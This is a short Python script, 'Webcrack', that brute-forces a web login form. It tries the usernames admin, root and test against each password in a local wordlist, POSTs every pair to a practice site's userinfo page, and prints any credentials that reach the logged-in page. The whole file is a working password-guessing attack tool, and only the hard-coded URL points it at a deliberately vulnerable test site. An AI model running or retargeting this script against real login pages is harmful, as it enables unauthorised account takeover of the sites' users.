import requests
import os 
import platform

if platform.system() == 'Linux':
    os.system('clear')
elif platform.system() == 'Windows':
    os.system('cls')
else:
    print(f"This system is running unknown os: {platform.system()}")


print("""
                    ██╗    ██╗███████╗██████╗  ██████╗██████╗  █████╗  ██████╗██╗  ██╗
                    ██║    ██║██╔════╝██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
                    ██║ █╗ ██║█████╗  ██████╔╝██║     ██████╔╝███████║██║     █████╔╝ 
                    ██║███╗██║██╔══╝  ██╔══██╗██║     ██╔══██╗██╔══██║██║     ██╔═██╗ 
                    ╚███╔███╔╝███████╗██████╔╝╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗
                     ╚══╝╚══╝ ╚══════╝╚═════╝  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ 

                                    Developed by Aman Chauhan v1.1
                                                                  
    """)

url = 'http://testphp.vulnweb.com/userinfo.php'
username = ['admin','root','test']

try:

    # User Bruteforce
    for user in username:
        with open("/home/kali/wordlists.txt","r") as passlist:

            # Password Bruteforce
            for password in passlist:
                password = password.strip()
                r = requests.post(url,data={'uname':user, 'pass':password})
                print(f'Trying: "{user}:{password}"')
                if "On this page you can visualize or edit you user information" in r.text:
                    print(f'[+] Valid Credentials Found! "{user}:{password}"')
                    break
            else:
                print(f'[-] No valid password found for user: "{user}"')

except KeyboardInterrupt:
    print("\n[x] Program cancelled by user"   )


print("\nThanks for using \"Webcrack!\" :)")